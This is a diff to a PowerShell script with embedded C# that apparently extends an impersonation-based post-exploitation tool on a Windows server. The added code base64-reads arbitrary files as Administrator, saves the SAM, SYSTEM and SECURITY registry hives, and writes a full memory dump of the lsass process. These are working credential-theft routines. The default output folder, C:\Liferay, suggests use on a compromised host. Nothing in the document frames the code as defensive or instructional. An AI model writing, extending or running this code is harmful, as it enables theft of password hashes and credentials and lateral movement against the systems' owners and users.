@@ -1,13 +1,13 @@
 param(
     [Parameter(Mandatory=$true)]
-    [ValidateSet('read','dir','exec')]
+    [ValidateSet('read','dir','exec','readb64','savehives','dumplsass')]
     [string]$Action,
 
-    [Parameter(Mandatory=$true)]
     [string]$Target,
 
     [string]$User = 'Administrator',
-    [string]$Domain = 'SRV01'
+    [string]$Domain = 'SRV01',
+    [string]$OutDir = 'C:\Liferay'
 )
 
 Add-Type -TypeDefinition @'
@@ -24,6 +24,12 @@ public class S4UI2 {
     [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateLoggedOnUser(IntPtr tok);
     [DllImport("advapi32.dll", SetLastError=true)] static extern bool RevertToSelf();
     [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("advapi32.dll")] static extern int RegOpenKeyEx(IntPtr key, string sub, int opt, int sam, out IntPtr res);
+    [DllImport("advapi32.dll")] static extern int RegSaveKey(IntPtr key, string file, IntPtr attr);
+    [DllImport("advapi32.dll")] static extern int RegCloseKey(IntPtr key);
+    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+    [DllImport("dbghelp.dll", SetLastError=true)] static extern bool MiniDumpWriteDump(IntPtr proc, int pid, IntPtr file, int type, IntPtr exc, IntPtr usr, IntPtr cb);
+    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr CreateFile(string name, uint access, uint share, IntPtr sa, uint disp, uint flags, IntPtr tmpl);
 
     [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
     struct LSA_STRING { public ushort Len, MaxLen; public string Buffer; }
@@ -96,11 +102,71 @@ public class S4UI2 {
         catch(Exception e) { return "ERR:"+e.Message; }
         finally { RevertToSelf(); }
     }
+
+    public static string ReadFileB64(string u, string d, string path) {
+        IntPtr tok=GetTok(u,d);
+        if(tok==IntPtr.Zero) return "NoToken";
+        bool ok=ImpersonateLoggedOnUser(tok); CloseHandle(tok);
+        if(!ok) return "ImpErr:"+Marshal.GetLastWin32Error();
+        try { return Convert.ToBase64String(File.ReadAllBytes(path)); }
+        catch(Exception e) { return "ERR:"+e.Message; }
+        finally { RevertToSelf(); }
+    }
+
+    public static string SaveHives(string u, string d, string samPath, string systemPath, string securityPath) {
+        IntPtr tok = GetTok(u, d);
+        if (tok == IntPtr.Zero) return "NoToken";
+        bool ok = ImpersonateLoggedOnUser(tok); CloseHandle(tok);
+        if (!ok) return "ImpErr:" + Marshal.GetLastWin32Error();
+        try {
+            bool was;
+            RtlAdjustPrivilege(17, true, true, out was);
+            var sb = new StringBuilder();
+            IntPtr HKLM = new IntPtr(unchecked((int)0x80000002));
+            foreach (var kv in new[] {
+                new[] { "SAM",      samPath },
+                new[] { "SYSTEM",   systemPath },
+                new[] { "SECURITY", securityPath }
+            }) {
+                IntPtr hKey;
+                int r = RegOpenKeyEx(HKLM, kv[0], 4, 0x20019, out hKey);
+                if (r != 0) { sb.AppendLine(kv[0] + ": OpenKey failed=" + r); continue; }
+                if (File.Exists(kv[1])) File.Delete(kv[1]);
+                r = RegSaveKey(hKey, kv[1], IntPtr.Zero);
+                RegCloseKey(hKey);
+                sb.AppendLine(kv[0] + ": " + (r == 0 ? "OK" : "FAIL=" + r));
+            }
+            return sb.ToString().Trim();
+        } catch(Exception e) { return "ERR:" + e.Message; }
+        finally { RevertToSelf(); }
+    }
+
+    public static string DumpLsass(string outPath) {
+        bool was;
+        RtlAdjustPrivilege(20, true, false, out was);
+        int lsassPid = -1;
+        foreach (var p in System.Diagnostics.Process.GetProcessesByName("lsass")) {
+            lsassPid = p.Id; break;
+        }
+        if (lsassPid == -1) return "ERR:lsass not found";
+        IntPtr hProc = OpenProcess(0x1FFFFF, false, lsassPid);
+        if (hProc == IntPtr.Zero) return "ERR:OpenProcess failed=" + Marshal.GetLastWin32Error();
+        if (File.Exists(outPath)) File.Delete(outPath);
+        IntPtr hFile = CreateFile(outPath, 0x40000000, 1, IntPtr.Zero, 2, 0, IntPtr.Zero);
+        if (hFile == new IntPtr(-1)) { CloseHandle(hProc); return "ERR:CreateFile failed=" + Marshal.GetLastWin32Error(); }
+        bool ok = MiniDumpWriteDump(hProc, lsassPid, hFile, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+        int err = Marshal.GetLastWin32Error();
+        CloseHandle(hFile); CloseHandle(hProc);
+        return ok ? "OK:" + outPath : "ERR:MiniDump failed=" + err;
+    }
 }
 '@
 
 switch ($Action) {
-    'read' { [S4UI2]::ReadFile($User, $Domain, $Target) }
-    'dir'  { [S4UI2]::ListDir($User, $Domain, $Target) }
-    'exec' { [S4UI2]::RunCmd($User, $Domain, $Target) }
+    'read'      { [S4UI2]::ReadFile($User, $Domain, $Target) }
+    'dir'       { [S4UI2]::ListDir($User, $Domain, $Target) }
+    'exec'      { [S4UI2]::RunCmd($User, $Domain, $Target) }
+    'readb64'   { [S4UI2]::ReadFileB64($User, $Domain, $Target) }
+    'savehives' { [S4UI2]::SaveHives($User, $Domain, "$OutDir\sam.hiv", "$OutDir\system.hiv", "$OutDir\security.hiv") }
+    'dumplsass' { [S4UI2]::DumpLsass("$OutDir\lsass.dmp") }
 }
